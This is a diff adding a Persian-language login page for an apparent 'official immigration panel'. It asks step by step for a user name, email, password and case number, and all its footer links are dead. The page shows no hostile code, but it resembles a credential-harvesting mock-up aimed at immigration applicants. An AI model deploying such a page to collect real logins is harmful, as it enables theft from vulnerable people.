@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پنل رسمی مهاجرتی</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+    <img src="logo.png" class="logo" alt="Logo">
+</header>
+
+<div id="loading">
+    <img src="https://i.gifer.com/ZZ5H.gif" width="50" alt="Loading">
+</div>
+
+<div class="login-container">
+    <h2>ورود به پنل کاربری</h2>
+    
+    <div class="field-group">
+        <input type="text" id="userName" placeholder="نام کاربری (User Name)">
+        <div id="err_userName" class="error-msg">❌ نام کاربری یافت نشد</div>
+    </div>
+
+    <div class="field-group">
+        <input type="email" id="email" placeholder="ایمیل (Email Address)" disabled>
+        <div id="err_email" class="error-msg">❌ ایمیل با این کاربری مطابقت ندارد</div>
+    </div>
+
+    <div class="field-group">
+        <input type="password" id="password" placeholder="رمز عبور (Password)" disabled>
+        <div id="err_password" class="error-msg">❌ رمز عبور نادرست است</div>
+    </div>
+
+    <div class="field-group">
+        <input type="text" id="caseNumber" placeholder="شماره کیس (Case Number)" disabled>
+        <div id="err_caseNumber" class="error-msg">❌ شماره کیس نامعتبر است</div>
+    </div>
+
+    <button id="loginBtn" disabled>ورود به پنل</button>
+</div>
+
+<footer id="main-footer">
+    <div class="footer-sec">
+        <h4>وکلای مهاجرتی</h4>
+        <a href="#">لیست وکلای استرالیا</a>
+        <a href="#">لیست وکلای انگلستان</a>
+        <a href="#">وکلای شینگن</a>
+    </div>
+    <div class="footer-sec">
+        <h4>قرارداد الکترونیکی</h4>
+        <a href="#">ایجاد قرارداد جدید</a>
+        <a href="#">دریافت وکیل رایگان</a>
+        <a href="#">پیگیری درخواست</a>
+    </div>
+    <div class="footer-sec">
+        <h4>ارتباط با ما</h4>
+        <a href="#">ایمیل آدرس</a>
+        <a href="#">واتساپ</a>
+        <a href="#">تلگرام</a>
+    </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
